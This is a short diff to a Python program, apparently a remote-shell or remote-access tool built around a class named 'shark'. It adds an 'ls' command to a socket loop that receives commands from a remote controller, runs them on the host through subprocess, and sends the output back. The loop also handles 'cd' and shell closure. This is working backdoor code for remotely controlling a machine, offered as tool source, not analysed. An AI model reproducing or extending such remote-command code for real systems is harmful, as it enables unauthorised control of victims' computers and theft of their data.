@@ -1037,6 +1037,9 @@ class shark:
                 print (F.RED+"[*]Host Closed Shell")
                 sock.close()
                 break
+            elif data.strip() == "ls":
+                out = sub.getoutput("ls -p")
+                sock.send(out.encode())
             elif data.startswith('cd '):
                 path = data[3:]
                 path = self.get_file(path)
@@ -1423,4 +1426,4 @@ if __name__ == '__main__':
 
 
 #------------------------------------------------------------------------------------------------------------------------------
-# end line 1425
+# end line 1428
